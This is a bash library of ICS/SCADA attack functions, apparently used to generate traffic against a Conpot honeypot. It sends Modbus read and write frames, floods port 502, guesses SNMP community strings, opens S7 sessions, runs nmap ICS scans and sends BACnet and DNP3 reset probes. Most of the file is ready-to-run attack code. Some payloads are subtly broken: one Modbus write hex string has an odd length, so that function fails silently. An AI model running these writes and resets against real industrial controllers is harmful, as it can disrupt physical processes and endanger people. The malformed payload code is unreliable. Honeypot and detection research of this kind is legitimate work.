#!/bin/bash
# lib/tactics_ics.sh - ICS/SCADA 공격 전술 함수

tactic_modbus_read() {
    local n=$(rand_int 10 30)
    python3 << PYEOF 2>/dev/null || true
import socket, time, random

target = '$CONPOT_IP'
port = 502

# 다양한 Modbus Function Code 요청
requests = [
    bytes.fromhex('000100000006010100000064'),  # FC01 Read Coils
    bytes.fromhex('000200000006010200000064'),  # FC02 Read Discrete Inputs
    bytes.fromhex('000300000006010300000064'),  # FC03 Read Holding Registers
    bytes.fromhex('000400000006010400000064'),  # FC04 Read Input Registers
]

for i in range($n):
    payload = random.choice(requests)
    # Transaction ID 랜덤화
    payload = bytes([random.randint(0,255), random.randint(0,255)]) + payload[2:]
    try:
        s = socket.create_connection((target, port), timeout=2)
        s.send(payload)
        s.recv(512)
        s.close()
    except Exception:
        pass
    time.sleep(random.uniform(0.05, 0.3))
PYEOF
}

tactic_modbus_write() {
    local n=$(rand_int 5 15)
    python3 << PYEOF 2>/dev/null || true
import socket, time, random

target = '$CONPOT_IP'
port = 502

# 쓰기 요청 (FC05, FC06, FC15, FC16)
write_requests = [
    bytes.fromhex('000500000006010500010ff00'),  # FC05 Write Single Coil ON
    bytes.fromhex('0006000000060106000100ff'),   # FC06 Write Single Register
    bytes.fromhex('000700000009010f00000008018f'),  # FC15 Write Multiple Coils
    bytes.fromhex('00080000000b01100000000202dead'),  # FC16 Write Multiple Registers
]

for i in range($n):
    payload = random.choice(write_requests)
    try:
        payload = bytes([random.randint(0,255), random.randint(0,255)]) + payload[2:]
        s = socket.create_connection((target, port), timeout=2)
        s.send(payload)
        s.recv(512)
        s.close()
    except Exception:
        pass
    time.sleep(random.uniform(0.1, 0.5))
PYEOF
}

tactic_modbus_flood() {
    local n=$(rand_int 20 50)
    for i in $(seq 1 $n); do
        echo "" | nc -w 1 "$CONPOT_IP" 502 2>/dev/null || true
    done
}

tactic_snmp_enum() {
    local communities=("public" "private" "community" "admin" "default" "manager" "guest")
    local comm
    comm=$(rand_pick "${communities[@]}")
    local versions=("v1" "v2c")
    local ver
    ver=$(rand_pick "${versions[@]}")

    snmpwalk -"$ver" -c "$comm" "$CONPOT_IP" 2>/dev/null | head -30 || true

    # 특정 OID 열거
    local oids=(
        "1.3.6.1.2.1.1.1.0"  # sysDescr
        "1.3.6.1.2.1.1.5.0"  # sysName
        "1.3.6.1.2.1.1.6.0"  # sysLocation
        "1.3.6.1.2.1.25.1.1.0"  # hrSystemUptime
        "1.3.6.1.4.1.111"    # vendor-specific
    )
    local n=$(rand_int 2 5)
    for oid in $(printf '%s\n' "${oids[@]}" | shuf | head -n $n); do
        snmpget -"$ver" -c "$comm" "$CONPOT_IP" "$oid" 2>/dev/null || true
    done
}

tactic_s7_attack() {
    local n=$(rand_int 10 25)
    python3 << PYEOF 2>/dev/null || true
import socket, time, random

target = '$CONPOT_IP'
port = 102

# TPKT + COTP Connection Request
cotp_cr = bytes([
    0x03, 0x00, 0x00, 0x16,
    0x11, 0xe0, 0x00, 0x00,
    0x00, 0x01, 0x00,
    0xc0, 0x01, 0x0a,
    0xc1, 0x02, 0x01, 0x00,
    0xc2, 0x02, 0x01, 0x02,
])

# S7 Communication Setup
s7_setup = bytes([
    0x03, 0x00, 0x00, 0x19,
    0x02, 0xf0, 0x80,
    0x32, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x08,
    0x00, 0x00, 0xf0, 0x00,
    0x00, 0x01, 0x00, 0x01,
    0x01, 0xe0,
])

for i in range($n):
    try:
        s = socket.create_connection((target, port), timeout=2)
        s.send(cotp_cr)
        time.sleep(0.1)
        s.send(s7_setup)
        s.recv(256)
        s.close()
    except Exception:
        pass
    time.sleep(random.uniform(0.1, 0.5))
PYEOF
}

tactic_ics_nmap_scan() {
    local scripts=("modbus-discover" "s7-info" "enip-info" "dnp3-info")
    local script
    script=$(rand_pick "${scripts[@]}")
    nmap -sV -T3 -p 102,502,20000,44818,47808 "$CONPOT_IP" 2>/dev/null || true
    nmap --script "$script" -p 502 "$CONPOT_IP" 2>/dev/null || true
}

tactic_bacnet_probe() {
    # BACnet UDP 탐색
    python3 << PYEOF 2>/dev/null || true
import socket, time

target = '$CONPOT_IP'

# BACnet Who-Is broadcast (포트 47808)
whois = bytes([
    0x81, 0x0b, 0x00, 0x08,  # BACnet/IP header
    0x01, 0x20, 0xff, 0xff,
    0x00, 0xff, 0x10, 0x08,
])

for i in range(5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.sendto(whois, (target, 47808))
        s.close()
    except Exception:
        pass
    time.sleep(0.5)
PYEOF
    nmap -sU -p 47808 "$CONPOT_IP" 2>/dev/null || true
}

tactic_dnp3_probe() {
    python3 << PYEOF 2>/dev/null || true
import socket, time

target = '$CONPOT_IP'
port = 20000

# DNP3 Data Link Layer Reset Link
dnp3_reset = bytes([
    0x05, 0x64, 0x05, 0xc0,
    0x01, 0x00, 0x00, 0x04,
    0xe9, 0x21,
])

for i in range(10):
    try:
        s = socket.create_connection((target, port), timeout=2)
        s.send(dnp3_reset)
        s.recv(256)
        s.close()
    except Exception:
        pass
    time.sleep(0.2)
PYEOF
}
